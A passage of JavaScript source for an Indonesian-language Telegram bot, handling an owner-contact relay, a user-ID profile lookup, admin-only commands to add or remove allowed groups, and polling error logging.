    const OTAX_ID = `${OWNER_ID}`
    const firstName = msg.from.first_name;
    const lastName = msg.from.last_name || ''; 
    const username = msg.from.username || 'Tidak ada username'; 
    const senderName = `${firstName} ${lastName}`.trim(); 

    
    if (!message) {
        bot.sendMessage(chatId, 'Silakan masukkan pesan setelah /owner.');
        return;
    }

    try {
        const ownerMessage = `Pesan dari pengguna:\n` +
                             `Nama: \`${senderName}\` (@${username})\n` +
                             `ID: \`${userId}\`\n` +
                             `Chat ID: \`${chatId}\`\n` +
                             `Pesan: ${message}\n
                             ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙`;

        bot.sendMessage(OTAX_ID, ownerMessage, { parse_mode: 'Markdown' });
        bot.sendMessage(chatId, 'Sabar Wahai BosKuh, Pesan Anda Telah Dikirim Ke Owner Bot\n ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙.');
    } catch (error) {
        console.error('Gagal mengirim pesan ke owner:', error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat mengirim pesan ke owner.');
    }
});
async function getUserInfo(userId) {
    try {
        const user = await bot.getChat(userId); 
        if (user) {
            const username = user.username || 'Tidak ada username';
            const firstName = user.first_name || 'Tidak ada nama depan';
            const lastName = user.last_name || 'Tidak ada nama belakang';
            const fullName = `${firstName} ${lastName}`.trim(); 

            return {
                id: userId,
                username: username,
                firstName: firstName,
                lastName: lastName,
                fullName: fullName,
            };
        } else {
            return null; 
        }
    } catch (error) {
        console.error('Gagal mendapatkan informasi pengguna:', error);
        return null; 
    }
}

// Handler untuk command /cek
bot.onText(/\/cek (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userIdToCek = parseInt(match[1], 10); 
if (shouldIgnoreMessage(msg)) return;
    if (isNaN(userIdToCek)) {
        bot.sendMessage(chatId, 'Format perintah salah. Gunakan /cek [ID Pengguna Telegram].');
        return;
    }

    const userInfo = await getUserInfo(userIdToCek);

    if (userInfo) {
        const { id, username, firstName, lastName, fullName } = userInfo;

        const message = `
👤 Informasi Pengguna:

  ID: ${id}
  Username: @${username}
  Nama Lengkap: ${fullName}
  ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙`;
        bot.sendMessage(chatId, message); 
    } else {
        bot.sendMessage(chatId, 'Pengguna tidak ditemukan atau informasi tidak dapat diakses.');
    }
});
bot.onText(/\/addgroup/, async (msg) => {

    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }

    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
    { parse_mode: "Markdown" }
  );
}

        addGroupToAllowed(chatId); 
    } catch (error) {
        console.error('Error adding group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menambahkan grup.');
    }
});


bot.onText(/\/delgroup/, async (msg) => {
    
    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }

        removeGroupFromAllowed(chatId); 
    } catch (error) {
        console.error('Error deleting group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menghapus grup.');
    }
});



bot.on("polling_error", async (err) => {
    await logErrorToFile(err, 'Polling Error', 'Kesalahan Polling Telegram');
    console.log(err);
});

